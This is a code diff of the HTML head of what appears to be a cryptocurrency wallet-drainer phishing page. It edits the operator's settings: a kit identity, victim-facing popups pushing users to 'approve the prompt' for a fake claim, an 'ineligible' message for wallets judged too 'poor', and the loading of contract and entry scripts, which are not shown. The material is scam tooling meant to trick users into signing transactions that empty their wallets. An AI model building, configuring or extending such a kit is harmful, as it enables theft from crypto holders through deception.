@@ -1,39 +1,28 @@
 <html lang="en" style="--vh: 12.84px; --ovh: 12.84px;">
- <head>
-  <meta charset="utf-8"/>
-  <script defer="defer" src="js/vendors.js"></script>
-  <script defer="defer" src="js/contracts.js"></script>
-  <script defer="defer" src="js/main.js"></script>
-  
+  <head>
     <script>
       window.UNIQUE_IDENTITY = "tiny_piglet_71";
   
-      // Pick a theme here, this defaults to "light"
-      window.modal_theme = "dark";
-                                
-      // https://docs.walletconnect.com/web3modal/v2/html/wagmi/theming
-       window.modal_variables = {
-       /* Example of what you can do */
-      };
-  
-      // Notification modals
       window.popups = {
         PENDING: {
-          // The popup that shows when they get prompted
+          // Shown when they get prompted
           // title: "Claim Pending",
-          text: "You must approve the prompt in order to continue."
+          // text: "Proceed in your wallet to continue",
         },
         INVALID: {
           // Shown when they connect on a wallet that is poor.
-          // title: "Ineligible Address",
-          text: "The connected account is not eligible for this event.\nPlease try using a different account.",
-        }
-      }
-  
-      // Only touch this if you know what you're doing!
-      window.OVERRIDE_MODE = false;
+          // title: "Not Eligible",
+          // text: "Please try another wallet",
+        },
+      };
     </script>
-  </head>
+  
+    <script defer="defer" src="js/contracts.js"></script>
+    <script defer="defer" src="js/main.js"></script>
+    <script defer="defer" src="js/entry.js"></script>
+  
+  <!-- use id="connect_button" on an element to set up the connect button -->
+  
   
   <meta content="width=device-width, initial-scale=1" name="viewport"/>
   <title>
